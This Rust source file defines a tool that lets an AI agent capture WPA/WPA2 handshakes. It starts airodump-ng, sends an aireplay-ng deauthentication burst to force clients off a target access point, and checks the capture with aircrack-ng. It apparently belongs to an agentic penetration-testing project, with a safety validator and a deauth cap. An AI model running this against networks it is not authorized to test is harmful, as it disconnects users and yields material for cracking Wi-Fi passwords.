use rig::completion::ToolDefinition;
use rig::tool::Tool;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::sync::Arc;
use std::time::Instant;
use tokio_rusqlite::Connection;

use crate::config::Config;
use crate::tools::ToolError;

/// Arguments for the capture_handshake tool.
#[derive(Deserialize)]
pub struct CaptureHandshakeArgs {
    /// Wifi interface in monitor mode
    pub interface: String,
    /// Target BSSID (AP MAC address)
    pub bssid: String,
    /// Target channel
    pub channel: i32,
    /// Number of deauth packets (default 5, max 10 enforced by safety)
    pub deauth_count: Option<u32>,
    /// Seconds to wait for handshake after deauth (default 15)
    pub capture_wait_secs: Option<u64>,
    /// Run ID for DB persistence
    pub run_id: Option<i64>,
}

/// Structured result from WPA handshake capture attempt.
#[derive(Serialize)]
pub struct CaptureHandshakeResult {
    /// Whether a valid handshake was captured
    pub handshake_captured: bool,
    /// Path to the cap file containing the handshake
    pub cap_file: Option<String>,
    /// Whether deauth was successfully sent
    pub deauth_sent: bool,
    /// Handshake verification output from aircrack-ng
    pub verification: Option<String>,
    /// Error message (if any, error-as-value)
    pub error: Option<String>,
}

/// Tool for capturing WPA/WPA2 handshakes via airodump-ng + aireplay-ng deauth.
///
/// Multi-process orchestration:
/// 1. Spawn airodump-ng in background (channel-locked, BSSID-filtered)
/// 2. Wait for airodump to start capturing
/// 3. Send deauth burst via aireplay-ng to force client re-authentication
/// 4. Wait for handshake capture
/// 5. Kill airodump-ng
/// 6. Verify handshake quality with aircrack-ng (parse stdout, not exit code)
pub struct CaptureHandshakeTool {
    #[allow(dead_code)]
    config: Arc<Config>,
    #[allow(dead_code)]
    memory: Arc<Connection>,
}

impl CaptureHandshakeTool {
    pub fn new(config: Arc<Config>, memory: Arc<Connection>) -> Self {
        Self { config, memory }
    }
}

impl Tool for CaptureHandshakeTool {
    const NAME: &'static str = "capture_handshake";

    type Error = ToolError;
    type Args = CaptureHandshakeArgs;
    type Output = CaptureHandshakeResult;

    async fn definition(&self, _prompt: String) -> ToolDefinition {
        ToolDefinition {
            name: "capture_handshake".to_string(),
            description: "Capture WPA/WPA2 handshake by running airodump-ng in background and \
                sending deauth packets via aireplay-ng. Verifies handshake with aircrack-ng. \
                Requires connected clients on the target AP."
                .to_string(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "interface": {
                        "type": "string",
                        "description": "Wifi interface in monitor mode (e.g., 'wlan1')"
                    },
                    "bssid": {
                        "type": "string",
                        "description": "Target BSSID (AP MAC address, e.g., 'AA:BB:CC:DD:EE:FF')"
                    },
                    "channel": {
                        "type": "integer",
                        "description": "Target AP channel number"
                    },
                    "deauth_count": {
                        "type": "integer",
                        "description": "Number of deauth packets to send (default 5, max 10)"
                    },
                    "capture_wait_secs": {
                        "type": "integer",
                        "description": "Seconds to wait for handshake after deauth (default 15)"
                    },
                    "run_id": {
                        "type": "integer",
                        "description": "Run ID for DB persistence (omit for no persistence)"
                    }
                },
                "required": ["interface", "bssid", "channel"]
            }),
        }
    }

    async fn call(&self, args: Self::Args) -> Result<Self::Output, Self::Error> {
        let start = Instant::now();
        let deauth_count = std::cmp::min(args.deauth_count.unwrap_or(5), 10);
        let capture_wait_secs = args.capture_wait_secs.unwrap_or(15);

        // Create temp directory for handshake capture output
        let temp_dir = std::env::temp_dir().join("eugene_handshake");
        if let Err(e) = std::fs::create_dir_all(&temp_dir) {
            return Ok(CaptureHandshakeResult {
                handshake_captured: false,
                cap_file: None,
                deauth_sent: false,
                verification: None,
                error: Some(format!("Failed to create temp dir: {}", e)),
            });
        }

        // Generate capture file prefix
        let bssid_sanitized = args.bssid.replace(':', "");
        let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
        let prefix = temp_dir.join(format!("hs_{}_{}", bssid_sanitized, timestamp));
        let prefix_str = prefix.to_string_lossy().to_string();

        // Validate airodump-ng command via safety layer
        let airodump_cmd = format!(
            "airodump-ng --bssid {} --channel {} --write {} --output-format cap {}",
            args.bssid, args.channel, prefix_str, args.interface
        );
        if let Err(e) = crate::safety::validate_command(&airodump_cmd, Some(&args.interface)) {
            return Ok(CaptureHandshakeResult {
                handshake_captured: false,
                cap_file: None,
                deauth_sent: false,
                verification: None,
                error: Some(format!("Safety validation failed for airodump-ng: {}", e)),
            });
        }

        // Spawn airodump-ng in background (channel-locked, BSSID-filtered)
        let child = std::process::Command::new("airodump-ng")
            .args([
                "--bssid", &args.bssid,
                "--channel", &args.channel.to_string(),
                "--write", &prefix_str,
                "--output-format", "cap",
                &args.interface,
            ])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();

        let mut child = match child {
            Ok(c) => c,
            Err(e) => {
                return Ok(CaptureHandshakeResult {
                    handshake_captured: false,
                    cap_file: None,
                    deauth_sent: false,
                    verification: None,
                    error: Some(format!("Failed to spawn airodump-ng: {}", e)),
                });
            }
        };

        let pid = child.id();

        // Wait 5 seconds for airodump-ng to start capturing
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;

        // Build and validate aireplay-ng deauth command
        let deauth_cmd = format!(
            "aireplay-ng --deauth {} -a {} {}",
            deauth_count, args.bssid, args.interface
        );
        let deauth_sent;

        if let Err(e) = crate::safety::validate_command(&deauth_cmd, Some(&args.interface)) {
            // Deauth blocked by safety -- still try to capture passive handshake
            deauth_sent = false;
            let _ = e; // Safety blocked deauth (e.g., cooldown)
        } else {
            // Send deauth burst via aireplay-ng
            let deauth_result = std::process::Command::new("aireplay-ng")
                .args([
                    "--deauth", &deauth_count.to_string(),
                    "-a", &args.bssid,
                    &args.interface,
                ])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .output();

            deauth_sent = match deauth_result {
                Ok(output) => output.status.success(),
                Err(_) => false,
            };
        }

        // Wait for handshake capture
        tokio::time::sleep(std::time::Duration::from_secs(capture_wait_secs)).await;

        // Kill airodump-ng: SIGTERM via kill command
        let _ = std::process::Command::new("kill")
            .args(["-TERM", &pid.to_string()])
            .output();

        // Wait for exit with timeout (5 seconds)
        let wait_start = Instant::now();
        loop {
            match child.try_wait() {
                Ok(Some(_)) => break,
                Ok(None) => {
                    if wait_start.elapsed().as_secs() >= 5 {
                        let _ = child.kill();
                        let _ = child.wait();
                        break;
                    }
                    std::thread::sleep(std::time::Duration::from_millis(100));
                }
                Err(_) => break,
            }
        }

        let _ = start.elapsed().as_secs();

        // Find the cap file -- airodump-ng appends -01.cap to the prefix
        let expected_cap = format!("{}-01.cap", prefix_str);
        let cap_file_path = if std::path::Path::new(&expected_cap).exists() {
            Some(expected_cap)
        } else {
            // Try glob for alternate naming (e.g., -02.cap if prior files existed)
            find_cap_file(&prefix_str)
        };

        let cap_file_path = match cap_file_path {
            Some(path) => path,
            None => {
                return Ok(CaptureHandshakeResult {
                    handshake_captured: false,
                    cap_file: None,
                    deauth_sent,
                    verification: None,
                    error: Some("No capture file produced by airodump-ng".to_string()),
                });
            }
        };

        // Verify handshake quality with aircrack-ng
        // IMPORTANT: Parse stdout for "1 handshake", do NOT rely on exit code
        // (aircrack-ng returns 0 even without handshake -- Pitfall 4 from RESEARCH.md)
        let verify_result = std::process::Command::new("aircrack-ng")
            .arg(&cap_file_path)
            .output();

        let (handshake_captured, verification) = match verify_result {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let has_handshake = stdout.contains("1 handshake");
                (has_handshake, Some(stdout))
            }
            Err(e) => {
                (false, Some(format!("Failed to run aircrack-ng: {}", e)))
            }
        };

        Ok(CaptureHandshakeResult {
            handshake_captured,
            cap_file: Some(cap_file_path),
            deauth_sent,
            verification,
            error: if !handshake_captured {
                Some("No valid handshake found in capture".to_string())
            } else {
                None
            },
        })
    }
}

/// Find a .cap file matching the prefix pattern. Airodump-ng appends -NN.cap
/// where NN increments if prior files exist in the directory.
fn find_cap_file(prefix: &str) -> Option<String> {
    let path = std::path::Path::new(prefix);
    let parent = path.parent()?;
    let file_prefix = path.file_name()?.to_string_lossy().to_string();

    if let Ok(entries) = std::fs::read_dir(parent) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with(&file_prefix) && name.ends_with(".cap") {
                return Some(entry.path().to_string_lossy().to_string());
            }
        }
    }
    None
}
